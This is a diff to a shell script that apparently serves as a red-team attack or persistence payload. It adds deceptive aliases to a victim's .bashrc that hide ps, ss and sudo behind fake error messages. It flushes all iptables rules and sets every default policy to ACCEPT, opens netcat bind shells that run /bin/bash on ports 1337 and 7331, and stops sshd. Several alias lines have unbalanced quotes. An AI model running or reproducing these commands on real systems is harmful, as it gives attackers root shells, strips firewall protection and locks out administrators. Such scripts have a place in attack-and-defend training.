@@ -5,34 +5,34 @@
 
 # Add lines to their .bashrc
 # Every good script needs some psychological warfare
-echo "alias ps=echo 'error: you cannot perform this operation unless you are root' " >> ~/.bashrc 
+echo "alias ps=\"echo 'error: you cannot perform this operation unless you are root'" >> ~/.bashrc 
 
-echo "alias ss=echo 'error: you cannot perform this operation unless you are root' " >> ~/.bashrc
+echo "alias ss=\"echo 'error: you cannot perform this operation unless you are root' " >> ~/.bashrc
 
-echo "alias sudo=echo 'Simon says... oh wait, Simon didn't say' " >> ~/.bashrc
+echo "alias sudo=\"echo 'Simon says... oh wait, Simon didnt say' " >> ~/.bashrc
 
 # Source the ~/.bashrc
 source ~/.bashrc
 
 # Flush iptables rules
-command iptables -F
-command iptables -t mangle -F
-command iptables -t nat -F
-command iptables -t filter -F
-command iptables -t raw -F
-command iptables -t security -F
+sudo iptables -F
+sudo iptables -t mangle -F
+sudo iptables -t nat -F
+sudo iptables -t filter -F
+sudo iptables -t raw -F
+sudo iptables -t security -F
 
 # Change default policies for 'iptables'
-command iptables -P INPUT ACCEPT
-command iptables -P OUTPUT ACCEPT
-command iptables -P FORWARD ACCEPT
+sudo iptables -P INPUT ACCEPT
+sudo iptables -P OUTPUT ACCEPT
+sudo iptables -P FORWARD ACCEPT
 
 # Open up netcat listeners for shells
-command nc -lp 1337 -e /bin/bash
-command nc -lp 7331 -e /bin/bash
+sudo nc -lp 1337 -e /bin/bash
+sudo nc -lp 7331 -e /bin/bash
 
 # Turn off ssh
-command systemctl stop sshd
+sudo systemctl stop sshd
 
 
 
